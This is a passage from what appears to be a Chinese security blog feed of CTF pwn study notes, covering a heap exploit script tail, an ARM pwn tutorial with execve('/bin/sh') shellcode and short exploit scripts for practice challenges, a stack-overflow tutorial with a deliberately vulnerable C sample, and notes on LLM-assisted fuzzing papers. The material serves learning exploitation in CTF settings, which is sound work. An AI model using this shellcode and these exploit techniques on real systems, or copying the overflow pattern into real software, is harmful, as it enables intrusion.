i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    cmd(<span class="hljs-string">b&quot;1&quot;</span>,<span class="hljs-string">b&quot;:&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;page&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">b&#x27;strings&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;page&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;page&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br>add() <span class="hljs-comment">#index 0</span><br>dele(<span class="hljs-number">0</span>)<br>add() <span class="hljs-comment">#index 1</span><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;sh\x00\x00&#x27;</span> + p32(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>show(<span class="hljs-number">0</span>)<br><br>ia()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Pwn</title>
      <link href="/2025/07/01/ctf/adv/cpp/"/>
      <url>/2025/07/01/ctf/adv/cpp/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM Pwn</title>
      <link href="/2025/07/01/ctf/heter/arm/"/>
      <url>/2025/07/01/ctf/heter/arm/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>arm 是一种广泛支持嵌入式、移动设备和服务器上的处理器架构，它支持 32 位和 64 位模式。arm 汇编有不同的指令集，针对不同的架构（ARMv7、ARMv8等）有不同的语法和特性。</p><p>ARM 架构，曾称进阶精简指令集机器（Advanced RISC Machine）更早称作Acorn RISC Machine，是一个32位精简指令集（RISC）处理器架构。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h3><ul><li>安装编译工具</li></ul><p>安装 ARM 架构交叉编译工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi <br>sudo apt install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu <br>sudo apt update<br>sudo apt install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf<br></code></pre></td></tr></table></figure><ul><li>编译流程</li></ul><p>将 arm 汇编文件编译为可执行文件，这里我们先要确定需要编译的目标文件端序，然后选择相应的编译工具。</p><p>这里我们以 arm 32 位架构小端序为例。</p><ol><li>将汇编文件编译为目标文件</li></ol><p>因为我们需要将汇编文件编译为 arm 架构小端序的可执行文件，所以这里选择 arm 即 arm 架构小端序编译工具，默认为 32 位。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">arm-linux-gnueabi-as <span class="hljs-built_in">demo</span>.s -o <span class="hljs-built_in">demo</span>.o<br></code></pre></td></tr></table></figure><ol start="2"><li>链接目标文件</li></ol><p>同样选择相应架构的链接器进行链接。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">mipsel-linux-gnu-ld <span class="hljs-built_in">example</span>.o -o <span class="hljs-built_in">example</span><br></code></pre></td></tr></table></figure><h3 id="运行和调试环境"><a href="#运行和调试环境" class="headerlink" title="运行和调试环境"></a>运行和调试环境</h3><ul><li>安装 qemu</li></ul><p>我们通过 qemu 来模拟运行。qemu 是一个模拟器，可以模拟多种处理器架构的计算机系统，这是我们实现跨平台运行二进制文件（如在 x86 的机子上跑其它架构程序）的工具</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo apt update<br>sudo apt install qemu qemu-<span class="hljs-keyword">user</span> <span class="hljs-title">qemu-system-arm</span> <br></code></pre></td></tr></table></figure><ul><li>远行流程</li></ul><p>根据可执行文件架构，选择对应的 qemu 来运行。</p><p>例如 arm 32位小端序架构，我们可以选择 <code>qemu-arm</code> 来运行</p><p>这里还要区分链接方式，如果动态链接则需要指定动态链接库。</p><p><strong>静态链接：</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-arm-<span class="hljs-keyword">static</span> ./demo<br></code></pre></td></tr></table></figure><p><strong>动态链接：</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">qemu</span>-<span class="hljs-meta">arm</span> -L /usr/<span class="hljs-meta">arm</span>-linux-gnu ./demo<br></code></pre></td></tr></table></figure><ul><li>调试流程</li></ul><p>安装<code>gdb-multiarch</code>来调试异架构程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install  gdb-multiarch<br></code></pre></td></tr></table></figure><p>首先我们通过 qemu 以调试模式运行程序，<code>-g</code>参数表示设置为调试模式，<code>1234</code>表示程序映射的端口。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-arm-<span class="hljs-keyword">static</span> -g <span class="hljs-number">1234</span> ./demo<br></code></pre></td></tr></table></figure><p>然后运行<code>gdb-multiarch</code>，并根据架构和端序设置参数。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">gdb-multiarch<br><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">arm</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br></code></pre></td></tr></table></figure><p>然后连接映射程序的端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> remote localhost:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><h2 id="运行调试"><a href="#运行调试" class="headerlink" title="运行调试"></a>运行调试</h2><ul><li>运行 arm 动态链接程序</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-arm -L /usr/arm-linux-gnueabi ./pwn<br></code></pre></td></tr></table></figure><ul><li>运行 aarch64 动态链接程序</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn<br></code></pre></td></tr></table></figure><ul><li>运行静态链接程序</li></ul><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-arm-<span class="hljs-keyword">static</span> ./pwn<br>qemu-aarch64-<span class="hljs-keyword">static</span> ./pwn<br></code></pre></td></tr></table></figure><ul><li>调试程序</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">gdb-multiarch pwn -q<br><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">arm</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">architecture aarch64</span><br>target <span class="hljs-comment">remote localhost:1234</span><br></code></pre></td></tr></table></figure><h2 id="ARM-架构知识"><a href="#ARM-架构知识" class="headerlink" title="ARM 架构知识"></a>ARM 架构知识</h2><p>ARM 32 位和 Aarch 64 位架构的基本区别</p><p> ARM 32 位（ARMv7 或之前版本）</p><ul><li><strong>寄存器数量</strong>：ARM 32 位架构通常有 16 个通用寄存器（R0 到 R15）。</li><li><strong>指令集</strong>：支持 ARM 和 THUMB 两种模式：<ul><li><strong>ARM 模式</strong>：32 位指令，通常每个指令长度为 32 位。</li><li><strong>THUMB 模式</strong>：16 位指令，减少了指令长度，通常适用于资源受限的系统。</li></ul></li><li><strong>堆栈和内存</strong>：一般情况下，内存寻址范围为 4GB。</li><li><strong>系统调用</strong>：通过寄存器和中断向内核请求服务。</li></ul><p> ARM 64 位（ARMv8 或之后版本）</p><ul><li><strong>寄存器数量</strong>：ARM 64 位架构提供 31 个通用寄存器（X0 到 X30），其中 <code>X30</code> 用作链接寄存器（LR）。</li><li><strong>指令集</strong>：ARMv8 引入了 AArch64 模式，完全不同于 32 位的 AArch32 模式。64 位架构的指令集与 32 位相比更加简洁，优化了指令长度和功能。<ul><li><strong>AArch64 模式</strong>：所有指令都是 64 位。</li><li><strong>AArch32 模式</strong>：向后兼容 ARMv7 等 32 位模式，支持 32 位指令。</li></ul></li><li><strong>内存寻址</strong>：支持更大内存寻址空间（最高支持 16 EB 的地址空间）。</li></ul><p><img src="/../../Mobile/%E6%A8%A1%E6%8B%9F/assets/Pasted%20image%2020241125212837.png"></p><p><img src="/../../Mobile/%E6%A8%A1%E6%8B%9F/assets/Pasted%20image%2020241125212844.png"></p><p>arm 运行模式</p><ul><li>用户模式（USR）：ARM处理器正常程序执行状态。</li><li>快速中断模式（FIQ）：高速数据传输或通道处理。</li><li>外部中断模式（IRQ）：通用的中断模式。</li><li>管理模式（SVC）：操作系统使用的保护模式。</li><li>数据访问终止模式（ABT）：当数据或指令预取终止时进入该模式，可用于虚拟存储及存储保护。</li><li>系统模式（SYS）：运行具有特权的操作系统任务。</li><li>未定义指定终止模式（UND）：未定义的指令执行是进入该模式</li></ul><h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><table><thead><tr><th>寄存器</th><th>说明</th></tr></thead><tbody><tr><td>X0 寄存器</td><td>用来保存返回值（或传参）</td></tr><tr><td>X1 ~ X7 寄存器</td><td>用来保存函数的传参</td></tr><tr><td>X8寄存器</td><td>也可以用来保存返回值</td></tr><tr><td>X9 ~ X28寄存器</td><td>一般寄存器，无特殊用途</td></tr><tr><td>x29(FP)寄存器</td><td>用来保存栈底地址</td></tr><tr><td>X30 (LR)寄存器</td><td>用来保存返回地址</td></tr><tr><td>X31(SP) 寄存器</td><td>用来保存栈顶地址</td></tr><tr><td>X31(ZR)寄存器</td><td>零寄存器，恒为0</td></tr><tr><td>X32(PC)寄存器</td><td>用来保存当前执行的指令的地址</td></tr></tbody></table><h3 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h3><ol><li>LDMIA R0,{R1,R2,R3,R4}</li></ol><p>LDM为：多寄存器 “内存取” 指令 IA 表示每次 LDM 指令结束之后 R0 增加 1 个字 最终结果为<code>R1=[R0],R1=[R0+#4],R1=[R0+#8],R1=[R0+#0xC]</code></p><ol start="2"><li>堆栈寻址（FA、EA、FD、ED）</li></ol><p>STMFD SP！，{R1-R7,LR}@将 R1-R7 以及 LR 入栈 LDMFD SP!，{}</p><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><p>arm 的函数调用约定</p><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><h2 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">.section .text<br>.globl _start<br><br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">movw</span> <span class="hljs-built_in">r5</span>,<span class="hljs-meta">#0x732f</span><br>movt <span class="hljs-built_in">r5</span>,<span class="hljs-number">0x68</span><br><span class="hljs-keyword">push</span> &#123;<span class="hljs-built_in">r5</span>&#125;<br><span class="hljs-keyword">movw</span> <span class="hljs-built_in">r5</span>,<span class="hljs-meta">#0x622f</span><br>movt <span class="hljs-built_in">r5</span>,<span class="hljs-meta">#0x6e69</span><br><span class="hljs-keyword">push</span> &#123;<span class="hljs-built_in">r5</span>&#125;<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>,sp<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>,<span class="hljs-meta">#0xb</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>,<span class="hljs-meta">#0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>,<span class="hljs-meta">#0</span><br>svc <span class="hljs-meta">#0</span><br></code></pre></td></tr></table></figure><p>先看一下 arm 的函数调用约定，函数的第 1<del>4 个参数分别保存在&#96;r0</del>r3<code>寄存器中，剩下的参数从右往左依次入栈，被调用者实现栈平衡，函数的返回值保存在</code>r0&#96;中。</p><p><img src="/assets/Pasted%20image%2020241126225847.png"></p><p>除此之外，arm 的<code>b/bl</code>等指令实现跳转；<code>pc</code>寄存器相当于x86的<code>eip</code>，保存下一条指令的地址，也是我们要控制的目标。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj_typo"></a>jarvisoj_typo</h3><ul><li>分析</li></ul><p><code>file</code>查看程序发现为 arm32 位架构，并且是静态链接的。</p><p><code>checksec</code>查保护发现程序没有栈溢出和 PIE 保护，我们只需要进行栈溢出攻击即可。</p><p><img src="/assets/Pasted%20image%2020250106092650.png"></p><p>我们可以在文件中找到<code>system</code>等危险函数和<code>/bin/sh</code>字符串。</p><p>我们通过 ROPgadget 来搜索程序中的onegadget。</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>  <br>cli_script()<br>io=gift[<span class="hljs-string">&quot;io&quot;</span>]<br>elf=gift[<span class="hljs-string">&quot;elf&quot;</span>]<br>  <br>sh=<span class="hljs-number">0x00064384</span><br>r0_r4_pc=<span class="hljs-number">0x00020904</span><br>  <br>ia()<br></code></pre></td></tr></table></figure><h3 id="Dest0g3-520迎新赛-ez-aarch"><a href="#Dest0g3-520迎新赛-ez-aarch" class="headerlink" title="[Dest0g3 520迎新赛]ez_aarch"></a>[Dest0g3 520迎新赛]ez_aarch</h3><ul><li><p>分析</p></li><li><p>exp</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29093</span>)<br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">40</span> + <span class="hljs-string">b&quot;\x50&quot;</span><br>io.recv()<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="shanghai2018-baby-arm"><a href="#shanghai2018-baby-arm" class="headerlink" title="shanghai2018_baby_arm"></a>shanghai2018_baby_arm</h3><p>编译代码<code>arm-linux-guneabi-gcc vuln.c -o vuln</code>动态调试分析</p><p>利用qemu运行程序</p><p><code>qemu-arm -L /usr/arm-linux-gnueabi -g 8888 ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa gdb-multiarch ./vuln</code></p><h3 id="骇极杯-2018-babyarm"><a href="#骇极杯-2018-babyarm" class="headerlink" title="骇极杯_2018_babyarm"></a>骇极杯_2018_babyarm</h3><ul><li>ret2text</li><li>ret2libc</li><li>ret2syscall</li><li>ret2shellcode</li></ul><blockquote><p><a href="https://zhuanlan.zhihu.com/p/388683540">ARM汇编入门指南 - 知乎</a><br><a href="https://chan-shaw.github.io/2020/03/20/arm%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">arm汇编语言学习笔记 | 安和桥南丶的博客</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈利用思考</title>
      <link href="/2025/07/01/ctf/stack/stack/"/>
      <url>/2025/07/01/ctf/stack/stack/</url>
      
        <content type="html"><![CDATA[<h2 id="栈是什么？"><a href="#栈是什么？" class="headerlink" title="栈是什么？"></a>栈是什么？</h2><p>栈（Stack）一般表示计算机中一种内存区域，用于存储程序在运行过程中需要管理的局部变量、、函数调用、、返回地址等数据。</p><p>栈的特点是后进先出（LIFO），也就是说，，栈中的数据按照先进后出的顺序进行访问。</p><h3 id="为什么我们需要栈内存"><a href="#为什么我们需要栈内存" class="headerlink" title="为什么我们需要栈内存"></a>为什么我们需要栈内存</h3><p>栈内存的存在主要是为了高效管理函数调用的局部变量、返回地址以及其他与函数执行相关的临时数据。它为函数调用提供了自动化的内存管理，使得程序可以在不需要手动干预的情况下高效地分配和回收内存。</p><p>栈中存在有哪些数据？</p><ul><li>临时变量</li><li>用户数据</li><li>环境变量</li></ul><h3 id="栈和堆的区别"><a href="#栈和堆的区别" class="headerlink" title="栈和堆的区别"></a>栈和堆的区别</h3><p>处理速度</p><h3 id="相关的漏洞有哪些？"><a href="#相关的漏洞有哪些？" class="headerlink" title="相关的漏洞有哪些？"></a>相关的漏洞有哪些？</h3><p>栈内存常见的漏洞主要是与栈溢出（Stack Overflow）相关。栈溢出是指栈空间的分配超出了系统为栈分配的限制，从而导致程序出现异常行为或被攻击者利用。</p><h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="函数调用流程"><a href="#函数调用流程" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><p>一般栈溢出漏洞的利用都是通过。据结合不同的机制，诞生了对栈溢出漏洞的多种利用手法。</p><h3 id="漏洞样本"><a href="#漏洞样本" class="headerlink" title="漏洞样本"></a>漏洞样本</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -fno-stack-protector -no-pie vuln.c -o vuln</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input:&quot;</span>);<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">0x20</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><h3 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法"></a>利用手法</h3><ul><li>ret2text</li><li>ret2libc</li><li>ret2shellcode</li><li>ret2syscall</li></ul><h3 id="架构区别"><a href="#架构区别" class="headerlink" title="架构区别"></a>架构区别</h3><p>x86架构和x64架构的区别在于传参方式。</p><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文笔记：Harnessing Large Language Models for Seed Generation in Greybox Fuzzing</title>
      <link href="/2025/07/01/fuzz/paper/seed/"/>
      <url>/2025/07/01/fuzz/paper/seed/</url>
      
        <content type="html"><![CDATA[<h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>灰盒模糊测试已经成为发现软件漏洞的首选技术，在效率和探索深度之间取得了平衡。虽然研究的重点是改进模糊技术，但高质量初始种子的重要性仍然至关重要，但往往被忽视。现有的种子生成方法是有限的，特别是对于具有非标准或自定义输入格式的程序。大型语言模型已经彻底改变了许多领域，在理解和生成跨各个知识领域的复杂模式方面展示了前所未有的能力。本文介绍了SeedMind，这是一个利用llm 通过智能种子生成来增强灰盒模糊的新系统。与之前的方法不同，SeedMind 使用 llm 来创建测试用例生成器，而不是直接生成测试用例。我们的方法实现了一个迭代的，反馈驱动的过程，引导 LLM 逐步细化测试用例生成，目标是增加代码覆盖的深度和广度。在开发SeedMind 的过程中，我们解决了一些关键挑战，包括输入格式限制、上下文窗口约束，以及确保一致的进度感知行为。对实际应用的深入评估表明，SeedMind 有效地利用llm来生成高质量的测试用例，并促进 bug 发现的模糊化，提供与人工创建种子相当的效用，并且显著优于现有的基于 llm 的解决方案。</p><h2 id="INTRODUCTION"><a href="#INTRODUCTION" class="headerlink" title="INTRODUCTION"></a>INTRODUCTION</h2><p>经过几十年的发展，灰盒模糊测试已经在软件漏洞挖掘领</p><p>为了发现代码中的错误，模糊被认为是最实用的技术之一，因为它很容易应用于生产级软件。经过几十年的发展，灰盒模糊[18,29,35]已经成为最可取的选择。通过利用轻量级仪器来获得驱动探索的运行时反馈，灰盒模糊测试在黑盒模糊测试[17]的效率和白盒模糊测试[20]的深度之间取得了平衡。成熟的灰盒fuzzers如AFL [13]， AFL [12]， honggfuzz[23]的出现进一步普及。</p><p>从技术上讲，灰盒模糊测试从一组初始测试用例开始（种子），并迭代地从种子中派生新的测试用例，以扩展代码覆盖率。因此，为了获得更好的结果，准备一组高质量的种子来引导模糊过程是至关重要的。例如，种子已经到达bug所在的位置可以显著降低触发bug的模糊测试的难度和时间成本。然而，获得优质种子并不容易。</p><p>在实际的模糊测试中，准备种子最常见的策略是通过手工检查程序逻辑和构建所需的测试用例。这种策略可能适用于接受流行格式输入的程序（例如，XML、PDF等），因为它们的测试用例很广泛，并且很容易收集。然而，对于具有非标准输入格式甚至自定义格式的程序，这种策略变得难以承受。另一种解决方案是运行能够自动生成测试用例的生成器。这仅在已经存在适用的生成器时有效。否则，必须从头开始构建新的生成器，正如我们将在§2.2中详细说明的那样，这通常是不可行或不切实际的。</p><p>人工智能的最新发展，特别是大型语言模型（llm），如生成预训练转换器（GPT），为通用的、轻松的种子准备提供了新的机会。许多大模型（GitHub Copilot、Amazon CodeWhisperer、OpenAI的GPT系列、Anthropic的Claude系列[1]等）在对大量代码、注释和文档进行预训练后，擅长于以代码为中心的任务（代码理解、代码总结、代码完成、代码翻译等）。该技术的一个直接应用将是运行一个LLM来分析目标程序的模糊测试，并生成它期望的测试用例。</p><p>事实上，最近的研究已经探索了模糊中种子生成的llm。建议的方法已经尝试使用各种输入（目标程序代码、示例测试用例、功能规范、文档等），并提示从llm请求测试用例。它们已经在不同的领域（解析器[2]、编译器[57]、Linux内核[60]和其他通用软件[30]）中证明了有效性。然而，由于未能解决几个基本挑战，它们可能严重破坏了法学硕士在种子生成方面的潜力。（C1）正在使用的LLM，即使是最新版本，也可能不支持许多输入格式。例如，OpenAI的新旗舰模型gpt40[40]拒绝生成二进制表示，因为它受限于文本格式。llm受其上下文窗口的限制——模型可以从其输入和响应[46]处理令牌的数量。任意地将信息（例如，目标程序的整个代码库）转储到llm可能会溢出上下文窗口并导致生成失败。已知llm呈现不可预测的行为，这会阻碍测试用例的生成。（C4）法学硕士可能缺乏对进展的基本理解。因此，它可能会忽略一个未完成的任务或无休止地重复一个已完成的任务。</p><h2 id="BACKGROUND"><a href="#BACKGROUND" class="headerlink" title="BACKGROUND"></a>BACKGROUND</h2><h3 id="Greybox-Fuzzing"><a href="#Greybox-Fuzzing" class="headerlink" title="Greybox Fuzzing"></a>Greybox Fuzzing</h3><p>Greybox Fuzzing（灰盒模糊测试）出现于 2000 年代中期，是黑盒模糊和白盒模糊之间的一种平衡。这一概念是由 AFL 等工具推广开来的。灰盒模糊测试的关键思想是在模糊测试期间使用轻量级的工具来获得运行时反馈（例如，代码覆盖率），并在反馈的指导下，选择和改变现有的测试用例以派生出新的测试用例。为了闭合循环，提供新贡献（例如，覆盖新代码）的新测试用例被保留以备将来的变化。</p><p>Greybox Fuzzing 活动通常从称为种子的初始测试用例语料库开始。种子质量对模糊处理性能有显著影响。例如，给定的种子覆盖了很大的代码区域，模糊测试发现更多bug的机会就会高得多，所需的时间也会短得多。因此，在启动灰盒模糊测试之前，准备一套高质量的种子已成为事实上的标准。</p><h3 id="Seed-Generation"><a href="#Seed-Generation" class="headerlink" title="Seed Generation"></a>Seed Generation</h3><p>为了准备高质量的种子，一个常见的做法是手动理解目标程序并制作所需的测试用例。然而，对于高度自动化的模糊测试过程来说，这并不理想。另一种方法是运行能够自动生成测试用例的生成器。然而，它面临着在没有可用的发电机时建造发电机的挑战。</p><p>迄今为止，有两种主要的构造生成器的方法。在给定目标程序所需的输入格式规范的情况下，人们手动开发符合规范的生成器来组装测试用例。这些生成器主要针对XML、HTML和MathML等标准格式，因为它们的规范有很好的文档记录。另一种方法是基于机器学习技术。在收集了目标程序接受的大量输入后，该方法训练一个模型（概率模型[53]、循环神经网络[21]、生成对抗网络[34]等）来学习输入结构，然后运行该模型来生成新的输入变体。</p><p>显然，上述两种方法并不可取。他们仍然要求人工来设计生成器或收集训练数据。更根本的是，它们缺乏普遍性。当目标程序需要按照非标准格式或全新格式输入时，这两种方法都变得不切实际。一方面，没有格式文档。颠倒程序来推断格式并相应地构建生成器是不可承受的。另一方面，令人满意的输入在野外变得罕见。建立有效训练数据集的资源有限。</p><h3 id="AI-for-Code"><a href="#AI-for-Code" class="headerlink" title="AI for Code"></a>AI for Code</h3><h2 id="PROBLEM-AND-CHALLENGES"><a href="#PROBLEM-AND-CHALLENGES" class="headerlink" title="PROBLEM AND CHALLENGES"></a>PROBLEM AND CHALLENGES</h2><h3 id="Problem-Statement"><a href="#Problem-Statement" class="headerlink" title="Problem Statement"></a>Problem Statement</h3><h3 id="Technical-Challenges"><a href="#Technical-Challenges" class="headerlink" title="Technical Challenges"></a>Technical Challenges</h3>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文笔记：LLAMAFUZZ: Large Language Model Enhanced Greybox Fuzzing</title>
      <link href="/2025/07/01/fuzz/paper/llamafuzz/"/>
      <url>/2025/07/01/fuzz/paper/llamafuzz/</url>
      
